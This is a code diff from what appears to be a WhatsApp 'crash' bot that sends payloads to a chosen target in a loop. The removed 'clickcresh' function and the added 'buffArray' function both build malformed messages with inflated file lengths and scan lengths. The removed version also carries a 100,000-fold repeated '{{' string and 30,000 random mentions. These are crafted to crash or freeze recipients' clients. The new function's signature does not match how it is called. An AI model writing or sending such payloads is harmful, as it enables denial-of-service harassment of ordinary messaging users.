@@ -2433,7 +2433,7 @@ Status      : Success
                     if (!sock) {
                         throw new Error("Socket unavailable");
                     }
-                    await clickcresh(sock, target);
+                    await buffArray(sock, target);
                     await sleep(1000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -3485,76 +3485,33 @@ async function Vdelay(sock, target) {
   }
 }
 
-async function clickcresh(sock, target) {
-  const messages = [
-    {
-      imageMessage: {
-        url: "https://mmg.whatsapp.net/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0&mms3=true",
-        mimetype: "image/jpeg",
-        fileSha256: "z8tbfc1DBcy9J0Gq7eJiu3ckMOyKKvbOs4Xl3J6UvGQ=",
-        fileLength: "999999999999",
-        height: 212,
-        width: 320,
-        mediaKey: "EiO5AfHhX1dTXqbBP5Wf/MzZ6qOqOG4nts9VrPv/rxY=",
-        fileEncSha256: "/PuWsqa9/5jDcRhuBexUEGjFN0wPHdXQPe/+SlSiwBU=",
-        directPath: "/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1778501051",
-        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAC8ASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABQIEBgEDAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABK0eKC9dyvDbCK+XhXZLYAcKosWaaBnLjFQVnGYcGrF4MKdzwIz8+nusagjXa2Jgx2H//EACcQAAICAgEDBAEFAAAAAAAAAAECAAMEERIFITEQExQgNSIyM0JR/9oACAEBAAE/AKLrFJPMynqFo8PKeqKR+pKsym3Wj9rem4tn9ADLujWps1NHD1rwdSCIDYSrpZxI8TH6haHSqzXKZGQ9YBXR3DdeD/IAZi3WWg8016tvideYUys3mjoAAezRum5SPEV0yC1ikHwJe9g/brUbOIdNrvRleUt4rNba03j0I2CJUxDsu+RWPchYAE/kCOeDoS25npz9rivcmZPvV8hxmwd78zBevHTuImWgQOXHGHwZ2cDiQCT3InAVAfnyYtVSncZQwjYd3MtsNL+m/I1pAhmTiXUaD+P9mSxGk36fHr2ddocYEd3YxMcaBbZP0dFcEMARM/pHLb0z/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
-        contextInfo: {
-          pairedMediaType: "NOT_PAIRED_MEDIA"
-        },
-        scansSidecar: "xt906ajMmv0EvBy89zTBKFs9rvAOwr8mIqV2kxGG6xUVyUSGmWzpuw=",
-        scanLengths: [
-          999999999999,
-          999999999999,
-          999999999999,
-          999999999999
-        ],
-        midQualityFileSha256: ""
-      }
-    },
-    {
-      ephemeralMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              title: "X",
-              hasMediaAttachment: false,
-              locationMessage: {
-                degreesLatitude: 666666666,
-                degreesLongitude: 666666666,
-                name: "X",
-                address: "X"
-              }
-            },
-            body: {
-              text: "X"
-            },
-            nativeFlowMessage: {
-              messageParamsJson: "{{".repeat(100000)
-            },
+async function buffArray(target) {
+    await sock.relayMessage(target, {
+        imageMessage: {
+            url: "https://mmg.whatsapp.net/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0&mms3=true",
+            mimetype: "image/jpeg",
+            fileSha256: "z8tbfc1DBcy9J0Gq7eJiu3ckMOyKKvbOs4Xl3J6UvGQ=",
+            fileLength: "999999999999",
+            height: 212,
+            width: 320,
+            mediaKey: "EiO5AfHhX1dTXqbBP5Wf/MzZ6qOqOG4nts9VrPv/rxY=",
+            fileEncSha256: "/PuWsqa9/5jDcRhuBexUEGjFN0wPHdXQPe/+SlSiwBU=",
+            directPath: "/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0",
+            mediaKeyTimestamp: "1778501051",
+            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAC8ASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABQIEBgEDAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABK0eKC9dyvDbCK+XhXZLYAcKosWaaBnLjFQVnGYcGrF4MKdzwIz8+nusagjXa2Jgx2H//EACcQAAICAgEDBAEFAAAAAAAAAAECAAMEERIFITEQExQgYSMyM0JR/9oACAEBAAE/AKLrFJPMynqFo8PKeqKR+pKsym3Wj9rem4tn9ADLujWps1NHD1rwdSCIDYSrpZxI8TH6haHSqzXKZGQ9YBXR3DdeD/IAZi3WWg8016tvideYUys3mjoAAezRum5SPEV0yC1ikHwJe9g/brUbOIdNrvRleUt4rNba03j0I2CJUxDsu+RWPchYAE/kCOeDoS25npz9rivcmZPvV8hxmwd78zBevHTuImWgQOXHGHwZ2cDiQCT3InAVAfnyYtVSncZQwjYd3MtsNL+m/I1pAhmTiXUaD+P9mSxGk36fHr2ddocYEd3YxMcaBbZP0dFcEMARM/pHLb0z/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
             contextInfo: {
-              participant: jid,
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from({ length: 30000 }, () =>
-                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-                )
-              ]
-            }
-          }
+                pairedMediaType: "NOT_PAIRED_MEDIA"
+            },
+            scansSidecar: "xt906ajMmv0EvBy89zTBKFs9rvAOwr8mIqV2kxGG6xUVyUSGmWzpuw=",
+            scanLengths: [
+                999999999999,
+                999999999999,
+                999999999999,
+                999999999999
+            ],
+            midQualityFileSha256: ""
         }
-      }
-    }
-  ];
-
-  for (const msg of messages) {
-    await sock.relayMessage(target, msg, {
-      messageId: null,
-      participant: { jid: target },
-      userJid: target
-    });
-  }
+    }, { participant: { jid: target } });
 }
 
 bot.launch()
